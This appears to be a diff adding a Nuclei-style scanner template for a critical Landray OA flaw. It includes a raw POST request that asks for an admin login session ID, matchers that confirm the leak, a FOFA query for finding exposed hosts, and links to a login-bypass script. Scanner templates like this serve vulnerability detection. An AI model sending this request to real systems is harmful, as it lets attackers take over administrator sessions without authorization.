@@ -1,0 +1,56 @@
+id: landray-oa-getLoginSessionId
+
+info:
+  name: Landray OA Datajson sessionid
+  author: SleepingBag945
+  severity: critical
+  description: |
+    Land oa 默认使用 kmssSecu des加密 sessionid 导致可以解密出cookie 解密脚本如下 reference
+  reference:
+    - https://github.com/tequilasunsh1ne/landray_getLoginSessionId_sessionleak?tab=readme-ov-file
+    - https://github.com/myh0st/scripts/blob/master/landray-oa-getLoginSessionId-login-bypass.py
+  classification:
+    cpe: cpe:2.3:a:landray:landray_office_automation:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: landray
+    product: landray_office_automation
+    fofa-query: app="Landray-OA系统"
+  tags: landray,rce,oast,vuln
+
+http:
+  - raw:
+      - |
+        POST /api/sys-authentication/loginService/getLoginSessionId.html HTTP/1.1
+        Host: {{Hostname}}
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 15
+
+        loginName=admin
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<errorMsg/><sessionId>"
+          - "/sessionId"
+          - "true"
+        condition: and
+      
+      - type: word
+        part: body
+        words:
+          - "sessionId"
+          - "result"
+          - "true"
+        condition: and
